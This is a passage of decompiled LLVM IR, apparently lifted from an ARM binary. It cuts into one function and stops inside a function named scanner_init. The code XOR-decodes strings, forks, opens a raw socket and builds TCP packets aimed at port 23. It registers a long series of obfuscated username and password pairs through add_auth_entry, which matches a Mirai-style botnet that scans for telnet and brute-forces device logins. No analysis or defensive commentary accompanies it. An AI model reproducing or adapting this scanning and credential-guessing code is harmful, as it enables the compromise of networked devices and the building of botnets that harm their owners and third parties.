  %v18_ebb4 = load i32, i32* @sb, align 4
  %v21_ebb4 = load i32, i32* @sl, align 4
  %v24_ebb4 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_22484.144 to i32), i32* @fp, align 4
  %v2_ebbc = load i32, i32* @global_var_22484.144, align 4
  store i32 ptrtoint (i32* @global_var_224b0.146 to i32), i32* @sl, align 4
  %v1_ebc8 = add i32 %v2_ebbc, 1
  store i32 %v1_ebc8, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_ebd4 = load i32, i32* @global_var_224b0.146, align 4
  store i32 %v2_ebd4, i32* %r0.global-to-local, align 4
  %v3_ebd8 = mul i32 %v1_ebc8, 16
  store i32 %v3_ebd8, i32* %r1.global-to-local, align 4
  %v4_ebe0 = inttoptr i32 %v2_ebd4 to i32*
  %v5_ebe0 = call i32 @realloc(i32* %v4_ebe0, i32 %v3_ebd8, i32 %arg3, i32 %v1_ebc8)
  %v2_ebe4 = load i32, i32* @global_var_22484.144, align 4
  store i32 %v2_ebe4, i32* %r2.global-to-local, align 4
  store i32 %v5_ebe0, i32* @r8, align 4
  %v0_ebec = load i32, i32* @r5, align 4
  store i32 %v0_ebec, i32* %r0.global-to-local, align 4
  %v1_ebf4 = load i32, i32* @sl, align 4
  %v2_ebf4 = inttoptr i32 %v1_ebf4 to i32*
  store i32 %v5_ebe0, i32* %v2_ebf4, align 4
  %v1_ebf8 = inttoptr i32 %v0_ebec to i8*
  %v2_ebf8 = call i32 @util_strlen(i8* %v1_ebf8)
  %sext = mul i32 %v2_ebf8, 16777216
  %v1_ebfc = sdiv i32 %sext, 16777216
  %v2_ebfc = add nsw i32 %v1_ebfc, 1
  store i32 %v2_ebfc, i32* @r4, align 4
  store i32 %v1_ebfc, i32* @r7, align 4
  store i32 %v2_ebfc, i32* @r0, align 4
  %v0_ec08 = call i32 @malloc()
  store i32 %v0_ec08, i32* %r0.global-to-local, align 4
  %v0_ec0c = load i32, i32* @r5, align 4
  store i32 %v0_ec0c, i32* %r1.global-to-local, align 4
  %v0_ec10 = load i32, i32* @r4, align 4
  store i32 %v0_ec10, i32* %r2.global-to-local, align 4
  store i32 %v0_ec08, i32* %r6.global-to-local, align 4
  %v3_ec18 = call i32 @util_memcpy(i32 %v0_ec08, i32 %v0_ec0c, i32 %v0_ec10)
  store i32 %v3_ec18, i32* %r0.global-to-local, align 4
  %v0_ec1c = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_ec1c, 1
  %extract.t6 = trunc i32 %v0_ec1c to i8
  br i1 %tmp22, label %dec_label_pc_ec40, label %dec_label_pc_ec24

dec_label_pc_ec24:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ec28

dec_label_pc_ec28:                                ; preds = %dec_label_pc_ec28, %dec_label_pc_ec24
  %v2_ec30 = phi i32 [ %v1_ec34, %dec_label_pc_ec28 ], [ 0, %dec_label_pc_ec24 ]
  %v1_ec28 = load i32, i32* %r6.global-to-local, align 4
  %v2_ec28 = add i32 %v1_ec28, %v2_ec30
  %v3_ec28 = inttoptr i32 %v2_ec28 to i8*
  %v4_ec28 = load i8, i8* %v3_ec28, align 1
  %v6_ec28 = zext i8 %v4_ec28 to i32
  %v1_ec2c = xor i32 %v6_ec28, 84
  store i32 %v1_ec2c, i32* %r3.global-to-local, align 4
  %v1_ec30 = trunc i32 %v1_ec2c to i8
  store i8 %v1_ec30, i8* %v3_ec28, align 1
  %v0_ec34 = load i32, i32* %r2.global-to-local, align 4
  %v1_ec34 = add i32 %v0_ec34, 1
  store i32 %v1_ec34, i32* %r2.global-to-local, align 4
  %v1_ec38 = load i32, i32* @r7, align 4
  %v9_ec38 = icmp eq i32 %v1_ec34, %v1_ec38
  br i1 %v9_ec38, label %dec_label_pc_ec40.loopexit, label %dec_label_pc_ec28

dec_label_pc_ec40.loopexit:                       ; preds = %dec_label_pc_ec28
  %extract.t = trunc i32 %v1_ec34 to i8
  br label %dec_label_pc_ec40

dec_label_pc_ec40:                                ; preds = %dec_label_pc_ec40.loopexit, %entry
  %v0_ec50.off0 = phi i8 [ %extract.t, %dec_label_pc_ec40.loopexit ], [ %extract.t6, %entry ]
  %v2_ec40 = load i32, i32* @global_var_22484.144, align 4
  %v2_ec44 = load i32, i32* @global_var_224b0.146, align 4
  %v3_ec48 = mul i32 %v2_ec40, 16
  store i32 %v3_ec48, i32* @sb, align 4
  %v2_ec4c = add i32 %v2_ec44, %v3_ec48
  store i32 %v2_ec4c, i32* %r2.global-to-local, align 4
  %v3_ec50 = add i32 %v2_ec4c, 12
  %v4_ec50 = inttoptr i32 %v3_ec50 to i8*
  store i8 %v0_ec50.off0, i8* %v4_ec50, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_ebe4, i32* %r3.global-to-local, align 4
  %v0_ec5c = load i32, i32* %r6.global-to-local, align 4
  %v1_ec5c = load i32, i32* @r8, align 4
  %v5_ec5c = mul i32 %v2_ebe4, 16
  %v6_ec5c = add i32 %v1_ec5c, %v5_ec5c
  %v7_ec5c = inttoptr i32 %v6_ec5c to i32*
  store i32 %v0_ec5c, i32* %v7_ec5c, align 4
  %v2_ec60 = load i32, i32* @global_var_224b0.146, align 4
  store i32 %v2_ec60, i32* @r7, align 4
  %v1_ec64 = inttoptr i32 %arg2 to i8*
  %v2_ec64 = call i32 @util_strlen(i8* %v1_ec64)
  %sext1 = mul i32 %v2_ec64, 16777216
  %v1_ec68 = sdiv i32 %sext1, 16777216
  %v2_ec68 = add nsw i32 %v1_ec68, 1
  store i32 %v2_ec68, i32* @r4, align 4
  store i32 %v1_ec68, i32* @r6, align 4
  store i32 %v2_ec68, i32* @r0, align 4
  %v0_ec74 = call i32 @malloc()
  store i32 %v0_ec74, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_ec7c = load i32, i32* @r4, align 4
  store i32 %v0_ec7c, i32* %r2.global-to-local, align 4
  store i32 %v0_ec74, i32* %r5.global-to-local, align 4
  %v3_ec84 = call i32 @util_memcpy(i32 %v0_ec74, i32 %arg2, i32 %v0_ec7c)
  store i32 %v3_ec84, i32* %r0.global-to-local, align 4
  %v0_ec88 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_ec88, 1
  %extract.t8 = trunc i32 %v0_ec88 to i8
  br i1 %tmp23, label %dec_label_pc_ecac, label %dec_label_pc_ec90

dec_label_pc_ec90:                                ; preds = %dec_label_pc_ec40
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ec94

dec_label_pc_ec94:                                ; preds = %dec_label_pc_ec94, %dec_label_pc_ec90
  %v2_ec9c = phi i32 [ %v1_eca0, %dec_label_pc_ec94 ], [ 0, %dec_label_pc_ec90 ]
  %v1_ec94 = load i32, i32* %r5.global-to-local, align 4
  %v2_ec94 = add i32 %v1_ec94, %v2_ec9c
  %v3_ec94 = inttoptr i32 %v2_ec94 to i8*
  %v4_ec94 = load i8, i8* %v3_ec94, align 1
  %v6_ec94 = zext i8 %v4_ec94 to i32
  %v1_ec98 = xor i32 %v6_ec94, 84
  store i32 %v1_ec98, i32* %r3.global-to-local, align 4
  %v1_ec9c = trunc i32 %v1_ec98 to i8
  store i8 %v1_ec9c, i8* %v3_ec94, align 1
  %v0_eca0 = load i32, i32* %r2.global-to-local, align 4
  %v1_eca0 = add i32 %v0_eca0, 1
  store i32 %v1_eca0, i32* %r2.global-to-local, align 4
  %v1_eca4 = load i32, i32* @r6, align 4
  %v9_eca4 = icmp eq i32 %v1_eca0, %v1_eca4
  br i1 %v9_eca4, label %dec_label_pc_ecac.loopexit, label %dec_label_pc_ec94

dec_label_pc_ecac.loopexit:                       ; preds = %dec_label_pc_ec94
  %extract.t7 = trunc i32 %v1_eca0 to i8
  br label %dec_label_pc_ecac

dec_label_pc_ecac:                                ; preds = %dec_label_pc_ecac.loopexit, %dec_label_pc_ec40
  %v0_ecbc.off0 = phi i8 [ %extract.t7, %dec_label_pc_ecac.loopexit ], [ %extract.t8, %dec_label_pc_ec40 ]
  %v2_ecac = load i32, i32* @global_var_22484.144, align 4
  store i32 %v2_ecac, i32* %r0.global-to-local, align 4
  %v2_ecb0 = load i32, i32* @global_var_224b0.146, align 4
  %v3_ecb4 = mul i32 %v2_ecac, 16
  store i32 %v3_ecb4, i32* %r1.global-to-local, align 4
  %v2_ecb8 = or i32 %v3_ecb4, 13
  %v3_ecbc = add i32 %v2_ecb8, %v2_ecb0
  %v4_ecbc = inttoptr i32 %v3_ecbc to i8*
  store i8 %v0_ecbc.off0, i8* %v4_ecbc, align 1
  store i32 ptrtoint (i16** @global_var_224b4.148 to i32), i32* %r4.global-to-local, align 4
  %v2_ecc8 = load i16, i16* bitcast (i16** @global_var_224b4.148 to i16*), align 4
  %v3_ecc8 = zext i16 %v2_ecc8 to i32
  store i32 %v3_ecc8, i32* %lr.global-to-local, align 4
  %v2_ecd0 = load i32, i32* @global_var_224b0.146, align 4
  store i32 %v2_ecd0, i32* %r2.global-to-local, align 4
  %v0_ecd8 = load i32, i32* %r1.global-to-local, align 4
  %v2_ecd8 = add i32 %v0_ecd8, %v2_ecd0
  store i32 %v2_ecd8, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_224b4.148 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_ece0 = load i32, i32* @sb, align 4
  %v1_ece0 = load i32, i32* @r7, align 4
  %v2_ece0 = add i32 %v1_ece0, %v0_ece0
  store i32 %v2_ece0, i32* %ip.global-to-local, align 4
  %v0_ece4 = load i32, i32* %r0.global-to-local, align 4
  %v1_ece4 = add i32 %v0_ece4, 1
  store i32 %v1_ece4, i32* %r0.global-to-local, align 4
  %v3_ece8 = add i32 %v2_ecd8, 10
  %v4_ece8 = inttoptr i32 %v3_ece8 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_224b4.148 to i32), i32 16), i32 16) to i16), i16* %v4_ece8, align 2
  %v0_ecec = load i32, i32* %lr.global-to-local, align 4
  %v1_ecec = trunc i32 %v0_ecec to i16
  %v2_ecec = load i32, i32* %r1.global-to-local, align 4
  %v3_ecec = add i32 %v2_ecec, 8
  %v4_ecec = inttoptr i32 %v3_ecec to i16*
  store i16 %v1_ecec, i16* %v4_ecec, align 2
  %v0_ecf0 = load i32, i32* %r5.global-to-local, align 4
  %v1_ecf0 = load i32, i32* %ip.global-to-local, align 4
  %v2_ecf0 = add i32 %v1_ecf0, 4
  %v3_ecf0 = inttoptr i32 %v2_ecf0 to i32*
  store i32 %v0_ecf0, i32* %v3_ecf0, align 4
  %v1_ecf4 = load i32, i32* @fp, align 4
  %v2_ecf4 = inttoptr i32 %v1_ecf4 to i32*
  store i32 %v1_ece4, i32* %v2_ecf4, align 4
  %v0_ecf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_ecf8 = trunc i32 %v0_ecf8 to i16
  %v2_ecf8 = load i32, i32* %r4.global-to-local, align 4
  %v3_ecf8 = inttoptr i32 %v2_ecf8 to i16*
  store i16 %v1_ecf8, i16* %v3_ecf8, align 2
  store i32 %v3_ebb4, i32* @r4, align 4
  store i32 %v6_ebb4, i32* @r5, align 4
  store i32 %v9_ebb4, i32* @r6, align 4
  store i32 %v12_ebb4, i32* @r7, align 4
  store i32 %v15_ebb4, i32* @r8, align 4
  store i32 %v18_ebb4, i32* @sb, align 4
  store i32 %v21_ebb4, i32* @sl, align 4
  store i32 %v24_ebb4, i32* @fp, align 4
  ret i32 %v1_ece4

; uselistorder directives
  uselistorder i32 %v3_ecb4, { 1, 0 }
  uselistorder i32 %v1_eca0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_ec74, { 1, 0, 2 }
  uselistorder i32 %v3_ec48, { 1, 0 }
  uselistorder i32 %v1_ec34, { 0, 2, 3, 1 }
  uselistorder i32 %v0_ec08, { 1, 0, 2 }
  uselistorder i32 %v2_ebe4, { 1, 0, 2 }
  uselistorder i32 %v3_ebd8, { 1, 0 }
  uselistorder i32 %v1_ebc8, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 5, 6, 0, 1, 2, 3, 4, 27, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp334 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_ed14 = load i32, i32* @r5, align 4
  %v18_ed14 = load i32, i32* @sb, align 4
  %v21_ed14 = load i32, i32* @sl, align 4
  %v24_ed14 = load i32, i32* @fp, align 4
  %v0_ed20 = call i32 @__libc_fork()
  %v7_ed24 = icmp eq i32 %v0_ed20, -1
  %. = zext i1 %v7_ed24 to i32
  %tmp369 = icmp slt i32 %v0_ed20, 1
  %storemerge328 = select i1 %tmp369, i32 %., i32 1
  store i32 %storemerge328, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_24fa4.140 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed40 = icmp eq i32 %storemerge328, 0
  store i1 %v2_ed40, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_ed20, i32* @global_var_24fa4.140, align 4
  br i1 %v2_ed40, label %dec_label_pc_ed5c, label %dec_label_pc_ed4c

dec_label_pc_ed4c:                                ; preds = %entry
  store i32 %v6_ed14, i32* @r5, align 4
  store i32 %v18_ed14, i32* @sb, align 4
  store i32 %v21_ed14, i32* @sl, align 4
  store i32 %v24_ed14, i32* @fp, align 4
  ret i32 %v0_ed20

dec_label_pc_ed5c:                                ; preds = %entry
  %v0_ed5c = call i32 @util_local_addr()
  store i32 ptrtoint (i32* @global_var_24f80.59 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_ed5c, i32* @global_var_24f80.59, align 4
  %v1_ed68 = call i32 @rand_init(i32 %v0_ed5c)
  %v0_ed6c = load i32, i32* @r4, align 4
  %v1_ed70 = inttoptr i32 %v0_ed6c to i32*
  %v2_ed70 = call i32 @__GI_time(i32* %v1_ed70)
  store i32 ptrtoint (i32* @global_var_224b8.142 to i32), i32* %r2.global-to-local, align 4
  store i32 388, i32* %r1.global-to-local, align 4
  store i32 %v2_ed70, i32* @global_var_224b8.142, align 4
  %v2_ed84 = call i32 @calloc(i32 356, i32 388)
  store i32 ptrtoint (i32* @global_var_24f9c.153 to i32), i32* %r3.global-to-local, align 4
  %v0_ed8c = load i32, i32* @r4, align 4
  store i32 %v0_ed8c, i32* %stack_var_-52, align 4
  store i32 %v2_ed84, i32* @global_var_24f9c.153, align 4
  store i32 %v0_ed8c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ed98

dec_label_pc_ed98:                                ; preds = %dec_label_pc_ed98.dec_label_pc_ed98_crit_edge, %dec_label_pc_ed5c
  %v2_edb4 = phi i32 [ %v2_edb4.pre, %dec_label_pc_ed98.dec_label_pc_ed98_crit_edge ], [ %v2_ed84, %dec_label_pc_ed5c ]
  %v0_ed9c = phi i32 [ %v0_ede4, %dec_label_pc_ed98.dec_label_pc_ed98_crit_edge ], [ %v0_ed8c, %dec_label_pc_ed5c ]
  %v1_edbc = add i32 %v0_ed9c, 1
  store i32 %v1_edbc, i32* %ip.global-to-local, align 4
  %v3_edc0 = mul i32 %v0_ed9c, 388
  %v2_edc8 = add i32 %v3_edc0, %v2_edb4
  store i32 %v2_edc8, i32* @r3, align 4
  store i32 %v2_edc8, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_eddc = add i32 %v2_edc8, 4
  %v3_eddc = inttoptr i32 %v2_eddc to i32*
  store i32 -1, i32* %v3_eddc, align 4
  %v0_ede0 = load i32, i32* @r5, align 4
  %v1_ede0 = load i32, i32* %r1.global-to-local, align 4
  %v2_ede0 = add i32 %v1_ede0, 12
  %v3_ede0 = inttoptr i32 %v2_ede0 to i32*
  store i32 %v0_ede0, i32* %v3_ede0, align 4
  %v0_ede4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_ede4, i32* %stack_var_-52, align 4
  %v5_ede8 = icmp slt i32 %v1_edbc, 356
  br i1 %v5_ede8, label %dec_label_pc_ed98.dec_label_pc_ed98_crit_edge, label %dec_label_pc_edec

dec_label_pc_ed98.dec_label_pc_ed98_crit_edge:    ; preds = %dec_label_pc_ed98
  %v2_edb4.pre = load i32, i32* @global_var_24f9c.153, align 4
  br label %dec_label_pc_ed98

dec_label_pc_edec:                                ; preds = %dec_label_pc_ed98
  %v8_edd8 = icmp eq i32 %v1_edbc, 356
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_edd8, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_edf4 = load i32, i32* %r2.global-to-local, align 4
  %v1_edf4 = add i32 %v0_edf4, 7
  store i32 %v1_edf4, i32* %r2.global-to-local, align 4
  %v3_edf8 = call i32 @socket(i32 2, i32 3, i32 %v1_edf4)
  store i32 ptrtoint (i32* @global_var_24fa0.155 to i32), i32* @lr, align 4
  %v2_ee00 = icmp eq i32 %v3_edf8, -1
  store i1 %v2_ee00, i1* %cpsr_c.global-to-local, align 1
  %v7_ee00 = icmp eq i32 %v3_edf8, -1
  store i1 %v7_ee00, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_edf8, i32* @r4, align 4
  store i32 %v3_edf8, i32* @global_var_24fa0.155, align 4
  br i1 %v7_ee00, label %dec_label_pc_104a8, label %dec_label_pc_ee10

dec_label_pc_ee10:                                ; preds = %dec_label_pc_edec
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_ee14 = load i32, i32* @r5, align 4
  store i32 %v0_ee14, i32* @r2, align 4
  %v2_ee18 = call i32 @__libc_fcntl(i32 %v3_edf8, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_ee20 = or i32 %v2_ee18, 2048
  store i32 %v1_ee20, i32* @r2, align 4
  %v0_ee24 = load i32, i32* @r4, align 4
  %v2_ee28 = call i32 @__libc_fcntl(i32 %v0_ee24, i32 4)
  %v2_ee30 = ptrtoint i32* %stack_var_-56 to i32
  %v2_ee34 = load i32, i32* @global_var_24fa0.155, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_ee3c = load i32, i32* @r5, align 4
  store i32 %v0_ee3c, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_ee44 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_ee44, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_ee54 = call i32 @__GI_setsockopt(i32 %v2_ee34, i32 %v0_ee3c, i32 3, i32 %v2_ee44, i32 4)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee58 = icmp eq i32 %v5_ee54, 0
  store i1 %v2_ee58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee58, label %dec_label_pc_ee60, label %dec_label_pc_1049c

dec_label_pc_ee60:                                ; preds = %dec_label_pc_ee10, %dec_label_pc_ee60
  %v0_ee60 = call i32 @rand_next()
  %v1_ee70 = mul i32 %v0_ee60, 256
  %v3_ee74 = and i32 %v1_ee70, 65280
  %tmp372 = udiv i32 %v0_ee60, 256
  %v4_ee78 = urem i32 %tmp372, 256
  %v5_ee78 = or i32 %v4_ee78, %v3_ee74
  store i32 %v5_ee78, i32* %r3.global-to-local, align 4
  %v2_ee7c = icmp ugt i32 %v5_ee78, 1023
  store i1 %v2_ee7c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee7c = icmp eq i32 %v5_ee78, 1024
  store i1 %v7_ee7c, i1* %cpsr_z.global-to-local, align 1
  %v3_ee80 = icmp ult i32 %v5_ee78, 1022
  br i1 %v3_ee80, label %dec_label_pc_ee60, label %dec_label_pc_ee84

dec_label_pc_ee84:                                ; preds = %dec_label_pc_ee60
  %v5_ee6c.le = trunc i32 %v0_ee60 to i16
  store i32 ptrtoint (i8** @global_var_22488.157 to i32), i32* %ip.global-to-local, align 4
  %v2_ee88 = load i8, i8* bitcast (i8** @global_var_22488.157 to i8*), align 4
  %v3_ee88 = zext i8 %v2_ee88 to i32
  %v1_ee8c = and i32 %v3_ee88, 240
  %v1_ee90 = or i32 %v1_ee8c, 5
  store i32 %v1_ee90, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_22488.157 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_2248a.158 to i16*), align 4
  %v0_eeb0 = call i32 @rand_next()
  %v1_eeb0 = trunc i32 %v0_eeb0 to i16
  %v3_eeb8 = load i8, i8* @global_var_224a8.161, align 1
  store i32 ptrtoint (i32* @global_var_2249c.160 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_22488.157 to i32), i32* %ip.global-to-local, align 4
  %v1_eec8 = urem i8 %v3_eeb8, 16
  store i16 %v1_eeb0, i16* bitcast (i32* @global_var_2248c.162 to i16*), align 4
  %v1_eed0 = or i8 %v1_eec8, 80
  store i32 64, i32* %r3.global-to-local, align 4
  store i8 64, i8* bitcast (i32* @global_var_22490.163 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_22491.164 to i8*), align 4
  store i8 %v1_eed0, i8* @global_var_224a8.161, align 1
  %v4_eee8 = sext i16 %v5_ee6c.le to i32
  store i32 %v4_eee8, i32* %r2.global-to-local, align 4
  store i32 5888, i32* %r1.global-to-local, align 4
  store i16 5888, i16* @global_var_2249e.165, align 2
  store i16 %v5_ee6c.le, i16* bitcast (i32* @global_var_2249c.160 to i16*), align 4
  %v0_eef8 = call i32 @rand_next()
  %v1_eef8 = trunc i32 %v0_eef8 to i16
  store i32 ptrtoint (i32* @global_var_2249c.160 to i32), i32* %ip.global-to-local, align 4
  %v3_ef00 = load i8, i8* @global_var_224a9.166, align 1
  %v4_ef00 = zext i8 %v3_ef00 to i32
  %v1_ef04 = or i32 %v4_ef00, 2
  store i32 %v1_ef04, i32* %r3.global-to-local, align 4
  store i16 %v1_eef8, i16* bitcast (i32* @global_var_224aa.167 to i16*), align 4
  %v1_ef0c = trunc i32 %v1_ef04 to i8
  store i8 %v1_ef0c, i8* @global_var_224a9.166, align 1
  store i32 ptrtoint (i32* @global_var_19acc.171 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_ef1c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ac8.169 to i32), i32 ptrtoint (i32* @global_var_19acc.171 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_19ad0.173 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_ef2c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ac8.169 to i32), i32 ptrtoint ([5 x i8]* @global_var_19ad0.173 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_19ad8.175 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_ef3c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ac8.169 to i32), i32 ptrtoint ([9 x i8]* @global_var_19ad8.175 to i32), i32 12)
  store i32 ptrtoint (i32* @global_var_19acc.171 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_ef4c = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19ae4.177 to i32), i32 ptrtoint (i32* @global_var_19acc.171 to i32), i32 7)
  store i32 ptrtoint ([9 x i8]* @global_var_19aec.179 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_ef5c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ac8.169 to i32), i32 ptrtoint ([9 x i8]* @global_var_19aec.179 to i32), i32 12)
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19af8.181 to i32), i32* %r1.global-to-local, align 4
  %v5_ef6c = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_19af8.181 to i32), i32 ptrtoint ([6 x i8]* @global_var_19af8.181 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_19b00.183 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_ef7c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ac8.169 to i32), i32 ptrtoint ([6 x i8]* @global_var_19b00.183 to i32), i32 9)
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19b08.185 to i32), i32* %r1.global-to-local, align 4
  %v5_ef8c = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19b08.185 to i32), i32 ptrtoint ([8 x i8]* @global_var_19b08.185 to i32), i32 14)
  store i32 ptrtoint ([8 x i8]* @global_var_19ae4.177 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_ef9c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ac8.169 to i32), i32 ptrtoint ([8 x i8]* @global_var_19ae4.177 to i32), i32 11)
  store i32 ptrtoint (i32* @global_var_19b10.187 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_efac = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ac8.169 to i32), i32 ptrtoint (i32* @global_var_19b10.187 to i32), i32 17)
  store i32 ptrtoint ([6 x i8]* @global_var_19b20.189 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_efbc = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ac8.169 to i32), i32 ptrtoint ([6 x i8]* @global_var_19b20.189 to i32), i32 9)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19b28.191 to i32), i32* %r1.global-to-local, align 4
  %v5_efcc = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19b28.191 to i32), i32 ptrtoint ([5 x i8]* @global_var_19b28.191 to i32), i32 8)
  store i32 ptrtoint (i32* @global_var_19b30.193 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_efdc = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19ae4.177 to i32), i32 ptrtoint (i32* @global_var_19b30.193 to i32), i32 15)
  store i32 ptrtoint (i32* @global_var_19b3c.195 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_efec = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19ae4.177 to i32), i32 ptrtoint (i32* @global_var_19b3c.195 to i32), i32 15)
  store i32 ptrtoint ([5 x i8]* @global_var_19b48.197 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_effc = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_19af8.181 to i32), i32 ptrtoint ([5 x i8]* @global_var_19b48.197 to i32), i32 9)
  %v2_f004 = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_f004, i32* @lr, align 4
  %v1_f32c = add i32 %v2_f004, 20
  %v1_f38c = add i32 %v2_f004, 16
  %v2_f38c = inttoptr i32 %v1_f38c to i32*
  %v1_f430 = add i32 %v2_f004, 12
  %v2_f430 = inttoptr i32 %v1_f430 to i32*
  %v2_f620 = ptrtoint i32* %stack_var_-40 to i32
  %v2_f668 = ptrtoint i32* %stack_var_-68 to i32
  %v2_f66c = ptrtoint i32* %stack_var_-224 to i32
  %v2_f670 = ptrtoint i32* %stack_var_-352 to i32
  %v2_100f4 = ptrtoint i32* %stack_var_-45 to i32
  %v2_10108 = ptrtoint i32* %stack_var_-77 to i32
  %v2_10060 = ptrtoint i32* %stack_var_-60 to i32
  %v2_f8bc = ptrtoint i32* %stack_var_-104 to i32
  %v2_10398 = ptrtoint i32* %stack_var_-96 to i32
  %v2_103f0 = ptrtoint i32* %stack_var_-42 to i32
  %v1_f39c = add i32 %v2_f004, 9
